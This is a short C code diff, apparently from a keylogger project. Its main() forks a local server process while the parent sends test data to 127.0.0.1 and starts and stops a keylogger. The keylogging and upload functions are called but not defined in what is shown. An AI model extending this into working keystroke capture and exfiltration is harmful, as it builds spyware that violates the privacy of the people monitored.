@@ -13,10 +13,28 @@
 
 int main()
 {
-	int len = 0;
-	char **file_list = list_files("../plugins", &len);
-	
-	init_plugins(file_list, len);
+	pid_t pid = fork();
+
+	if (pid < 0)
+	{
+		DEBUG_PRINT((P_ERROR "Fork failed\n"));
+		return ERROR;
+	}
+	else if (pid == 0)
+	{
+		start_server(PORT);
+	}
+	else
+	{
+		sleep(2);
+		upload_data("127.0.0.1", PORT, "testing", strlen("testing"));
+
+		keylogger_init();
+
+		sleep(2);
+
+		keylogger_end();
+	}
 
 	add_terminal_message_with_colour("prueba final lol", TERMINAL_LIGHT_CYAN);
 
